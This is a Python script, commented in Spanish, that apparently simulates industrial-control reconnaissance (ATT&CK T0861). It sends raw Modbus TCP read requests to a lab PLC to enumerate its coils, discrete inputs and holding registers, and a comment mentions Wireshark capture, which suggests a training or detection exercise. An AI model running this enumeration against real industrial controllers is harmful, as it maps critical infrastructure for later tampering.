import socket
import time

IP_PLC = '192.168.70.129'
PORT_ICS = 502

print("[*] Simulando Técnica T0861 - Point & Tag Identification")
print("[-] El atacante mapea la memoria del PLC para descubrir puntos de datos activos (Tags)...")

try:
    # Establecemos el Three-Way Handshake
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP_PLC, PORT_ICS))
    
    # 1. Escaneo de Salidas Digitales (FC 01 - Read Coils)
    print("[-] Mapeando área de actuadores (Coils)...")
    # TransID: 0001, Lee 20 Coils desde la dirección 0
    payload_coils = b'\x00\x01\x00\x00\x00\x06\x01\x01\x00\x00\x00\x14'
    s.send(payload_coils)
    s.recv(1024)
    time.sleep(0.2) # Pequeña pausa para que se vea claro en Wireshark

    # 2. Escaneo de Entradas Digitales (FC 02 - Read Discrete Inputs)
    print("[-] Mapeando área de sensores (Discrete Inputs)...")
    # TransID: 0002, Lee 20 Entradas desde la dirección 0
    payload_di = b'\x00\x02\x00\x00\x00\x06\x01\x02\x00\x00\x00\x14'
    s.send(payload_di)
    s.recv(1024)
    time.sleep(0.2)

    # 3. Escaneo de Variables Analógicas (FC 03 - Read Holding Registers)
    print("[-] Mapeando área de configuración y setpoints (Holding Registers)...")
    # TransID: 0003, Lee 10 Registros desde la dirección 0
    payload_hr = b'\x00\x03\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0A'
    s.send(payload_hr)
    s.recv(1024)

    # Cierre limpio TCP
    s.close()
    print("[+] Enumeración de memoria completada. Puntos identificados.")

except Exception as e:
    print(f"[!] Error de conexión: {e}")
